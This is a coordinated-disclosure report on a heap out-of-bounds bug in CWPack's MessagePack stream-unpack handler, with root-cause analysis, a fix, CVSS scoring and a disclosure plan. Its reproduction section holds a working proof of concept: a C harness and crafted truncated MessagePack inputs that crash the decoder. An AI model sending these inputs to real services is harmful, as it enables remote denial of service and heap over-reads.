# CWPack — heap out-of-bounds (negative-size `memmove`) in the stream-unpack refill handler

**Status:** **reported privately to the maintainer 2026-08-19** — fix window 90 days, expires
**2026-11-17**; *no public report found* at time of reporting (see §7); no CVE assigned
**Discovered by:** Nemesis Forge (autonomous fuzzing engine), 2026-07-18
**Class:** CWE-787 / CWE-131 — out-of-bounds write via unchecked short read → negative size passed to `memmove`
**Severity (provisional):** **High — CVSS 3.1 base 7.1** (`AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:H`): remote DoS + bounded heap over-read on untrusted input; controlled-write/RCE not proven (see §6)
**Component:** `goodies/basic-contexts/basic_contexts.c` — `handle_stream_unpack_underflow`
**Affected version:** current `master` (commit `833fec9`, latest as of writing; the repository has had no source changes since 2022-03-11)

---

## 1. Summary

CWPack's provided stream-unpack context (`stream_unpack_context`, the documented way to
decode MessagePack from a `FILE*`) mishandles a **short read** from `fread`. When the
underlying stream returns fewer bytes than the parser requested, the refill handler
returns `CWP_RC_OK` anyway. The core parser then advances its read cursor `current` by the
number of bytes it *asked for* rather than the number actually available, pushing
`current` **past** the buffer end `end`. On the next refill, the handler computes
`remains = (unsigned long)(end - current)`, which underflows to a large/negative value, and
passes it to `memmove` — AddressSanitizer reports `negative-size-param: (size=-4)`.

The bytes that set the request size are attacker-controlled (a MessagePack `str`/`bin`/
`array` length field), so an attacker who can supply a **truncated** or **length-lying**
MessagePack stream to an application using the stream-unpack context triggers the bug.

## 2. Location

`goodies/basic-contexts/basic_contexts.c`, function `handle_stream_unpack_underflow`
(crash at `basic_contexts.c:159`, the `memmove`).

```c
static int handle_stream_unpack_underflow(struct cw_unpack_context* uc, unsigned long more)
{
    stream_unpack_context* suc = (stream_unpack_context*)uc;
    unsigned long remains = (unsigned long)(uc->end - uc->current);   /* <- underflows to huge value */
    if (remains)
    {
        memmove (uc->start, uc->current, remains);                    /* :159  negative-size-param  */
    }

    if (suc->buffer_length < more)
    {
        while (suc->buffer_length < more)
            suc->buffer_length = 2 * suc->buffer_length;
        void *new_buffer = realloc (uc->start, suc->buffer_length);   /* :167 */
        if (!new_buffer)
            return CWP_RC_BUFFER_UNDERFLOW;
        uc->start = (uint8_t*)new_buffer;
    }
    uc->current = uc->start;
    uc->end = uc->start + remains;
    unsigned long l = fread(uc->end, 1, suc->buffer_length - remains, suc->file);
    if (!l)                                    /* <- only ZERO is treated as short; l < more is NOT */
    {
        if (feof(suc->file))
            return CWP_RC_END_OF_INPUT;
        suc->uc.err_no = ferror(suc->file);
        return CWP_RC_ERROR_IN_HANDLER;
    }
    uc->end += l;                              /* end advances by ACTUAL bytes (l), which may be < more */
    ...
    return CWP_RC_OK;                          /* <- returns OK even though fewer than `more` bytes arrived */
}
```

## 3. Root cause (step by step)

The core parser reserves space via `cw_unpack_assert_space_sub` in `src/cwpack_internals.h`:

```c
p = unpack_context->current;
uint8_t* nyp = p + more;
if (nyp > unpack_context->end)
{
    int rc = unpack_context->handle_unpack_underflow(unpack_context, (unsigned long)(more));
    ... /* on CWP_RC_OK it assumes `more` bytes are now available */
    p   = unpack_context->current;
    nyp = p + more;
}
unpack_context->current = nyp;   /* advance by `more`, unconditionally */
```

1. The parser needs `more` bytes (e.g. a `str` payload whose length came from the input).
2. It calls `handle_stream_unpack_underflow(uc, more)`.
3. The handler `fread`s up to `buffer_length - remains` bytes and gets `l` bytes.
   If the stream is **truncated**, `l < more` but `l != 0`.
4. The handler takes the `l != 0` path, sets `end += l`, and returns **`CWP_RC_OK`** —
   signalling "space satisfied" when it is not.
5. The core trusts `CWP_RC_OK` and sets `current = p + more`. Now `current > end` by
   `more - l` bytes.
6. The next parser step needs more bytes → `handle_stream_unpack_underflow` runs again →
   `remains = end - current` is **negative** (unsigned-wrapped to ~`ULONG_MAX`) →
   `memmove(start, current, remains)` → heap out-of-bounds.

The handler's only short-read guard is `if (!l)` — it catches a *zero-byte* read (true EOF/
error) but never the **partial** read `0 < l < more`. That is the defect.

## 4. Reproduction

**Minimal proof of concept** — the simplest documented stream-unpack loop, no tricks:

```c
/* poc.c */
#include <stdio.h>
#include <string.h>
#include "basic_contexts.h"

int main(int argc, char** argv) {
    FILE* f = fopen(argv[1], "rb");
    if (!f) return 0;
    stream_unpack_context suc;
    memset(&suc, 0, sizeof(suc));
    init_stream_unpack_context(&suc, 16, f);          /* small buffer forces the refill path */
    while (suc.uc.return_code == CWP_RC_OK)
        cw_unpack_next((cw_unpack_context*)&suc);
    terminate_stream_unpack_context(&suc);
    fclose(f);
    return 0;
}
```

Build & run:

```sh
clang -fsanitize=address -g -O1 \
  -Igoodies/basic-contexts -Isrc \
  poc.c goodies/basic-contexts/basic_contexts.c src/cwpack.c -o poc
./poc crash.bin
```

**Crashing input — minimal (17 bytes), recommended.** A `fixstr` header (`0xB6`) that
declares a 22-byte string followed by only 16 bytes. No Python/base64 needed:

```sh
printf '\xb6\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff' > crash.bin
# sha256: 8a53f4c9249cc5ac4b2f2a7d3c7beca8c7989b4f149bdee864d0402763d34bed
```

The 16 filler bytes are arbitrary; only the count (< declared 22) matters. This reports
`negative-size-param: (size=-6)`.

**Crashing input — original fuzzer input (74 bytes).** Same bug, `size=-4`:

- sha256: `dce348de62f29552da54cc15652e2aa032a27e119ac9dfd73c7aa83909703aec`
- base64: `BQUF/////////////////////////////////////////////////////////////////////7b//////////////////////wU=`

```sh
python3 -c "import base64;open('crash.bin','wb').write(base64.b64decode('BQUF/////////////////////////////////////////////////////////////////////7b//////////////////////wU='))"
```

**Observed ASan output:**

```
==ERROR: AddressSanitizer: negative-size-param: (size=-4)
    #0 __asan_memmove
    #1 handle_stream_unpack_underflow basic_contexts.c:159
    #2 cw_unpack_next cwpack.c:476
    #3 main poc.c:15
SUMMARY: AddressSanitizer: negative-size-param basic_contexts.c:159 in handle_stream_unpack_underflow
```

The 32-byte region it overruns was `realloc`'d by an earlier call to the same handler
(`basic_contexts.c:167`), confirming the two-phase current-past-end sequence in §3.

## 5. Suggested fix

Treat a **partial** read as underflow, not success. In `handle_stream_unpack_underflow`,
loop the `fread` until at least `more` bytes are buffered, or fail cleanly:

```c
/* fill until we actually have `more` bytes available (end - current), or EOF/err */
while ((unsigned long)(uc->end - uc->current) < more)
{
    unsigned long want = suc->buffer_length - (unsigned long)(uc->end - uc->start);
    unsigned long l = fread(uc->end, 1, want, suc->file);
    if (!l)
    {
        if (feof(suc->file))  return CWP_RC_END_OF_INPUT;
        suc->uc.err_no = ferror(suc->file);
        return CWP_RC_ERROR_IN_HANDLER;
    }
    uc->end += l;
}
```

Independently, the core could defensively reject `current > end` after any handler returns
`CWP_RC_OK`, so a non-conforming custom handler cannot corrupt memory.

## 6. Risk, impact and severity

### 6.1 What an attacker can do

The trigger is a single MessagePack message whose declared blob length exceeds the bytes
that actually follow — trivially craftable, no secrets or preconditions. Any position in a
data flow where **untrusted MessagePack reaches a `stream_unpack_context`** is exposed:

- **Network services** that speak MessagePack over a socket/pipe wrapped in a `FILE*`
  (RPC endpoints, IoT/telemetry brokers, game servers). A remote, unauthenticated peer sends
  one malformed frame and crashes the decoder/process.
- **File / message parsers** that decode MessagePack documents from disk or a queue
  (config, save files, cached blobs). A poisoned file crashes the consumer on open.
- **Embedded / edge devices** (CWPack's stated niche — "no allocations in the basic setup",
  popular on microcontrollers) where a crash is a hard fault and recovery may mean a reboot.

### 6.2 Impact tiers

| Tier | Status | Detail |
| --- | --- | --- |
| **Availability (DoS)** | **Confirmed** | Deterministic heap out-of-bounds `memmove` → immediate crash. One small message downs the process/decoder. Repeatable at will. |
| **Confidentiality (info leak)** | **Confirmed (bounded)** | Before the fatal `memmove`, the parser returns a `str`/`bin` item whose `length` (e.g. 22) exceeds the valid bytes (16). An application that reads `item.as.str.start[0..length]` over-reads adjacent heap — up to the declared length can leak into application output/logs. |
| **Integrity (controlled write / RCE)** | **Not proven — not claimed** | The `memmove` size is `~ULONG_MAX`, which normally walks into unmapped memory and faults. Turning it into a bounded, attacker-shaped write would need heap grooming so the copy stays mapped and lands useful bytes at `buffer_start`; that is allocator/platform dependent and has **not** been demonstrated. |

### 6.3 Severity (CVSS 3.1)

**Confirmed / conservative rating** — remote DoS plus a bounded out-of-bounds read:

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:H   → 7.1 (High)
```

- `AV:N` reachable from wherever the untrusted MessagePack enters (network for a service).
- `AC:L / PR:N / UI:N` — one crafted message, no auth, no user interaction.
- `C:L` bounded heap over-read; `A:H` reliable crash; `I:N` no proven write.

**If reachability is local-only** (e.g. a file parser not exposed to the network), use
`AV:L` → `CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:H` = **5.1 (Medium)**.

**Upper bound (not claimed):** a demonstrated controllable heap write would move `I` to
`H`/high and push the score toward **9.8 (Critical)**. We explicitly do **not** assert this;
the responsible rating for what is proven is **High (7.1)**.

### 6.4 Risk-reducing / risk-increasing factors

- **Reduces risk:** the affected code is in `goodies/basic-contexts/` — CWPack's *provided*
  stream-context, not `src/cwpack.c` core. A maintainer may class it as reference code.
  Applications that write their own unpack context with a correct short-read loop, or that
  fully buffer input before unpacking (`buffer_unpack_context`), are unaffected.
- **Increases risk:** it is the documented, canonical way to stream-decode with CWPack and is
  commonly copied verbatim; it triggers via the *simplest* usage; it is platform-independent
  (64-bit and 32-bit); and it is unfixed in the latest release.

## 7. Novelty verification (what was checked)

| Source | Result |
| --- | --- |
| NVD / CVE (MessagePack) | No CWPack entry; all hits are MessagePack-C#/.NET or msgpack-python |
| OSV.dev | No match |
| GitHub Security Advisories | Nearest is msgpack-python (different library) |
| CWPack issue tracker | One relevant issue, **#22** — a *32-bit pointer-arithmetic wrap* in `cw_unpack_assert_space_sub` / `cw_pack_reserve_space` (`cwpack_internals.h`). Its author explicitly states it **does not involve** `handle_stream_unpack_underflow` or `fread` short reads. Different file, function, root cause, and platform (32-bit vs this 64-bit crash). |
| Upstream fix | None — latest `master` still contains the code above |

"Novel" here means **no public report was found** after the sweep above — the honest
standard, not a proof of non-existence. This finding is distinct from CWPack issue #22.

## 8. Disclosure

Coordinated disclosure only. Recommended path: open a private report to the maintainer
(`github.com/clwi/CWPack`) with §2–§5, offer the fix in §5, and agree on a timeline before
any public write-up. No third-party systems were scanned; the bug was found by fuzzing the
open-source library locally.
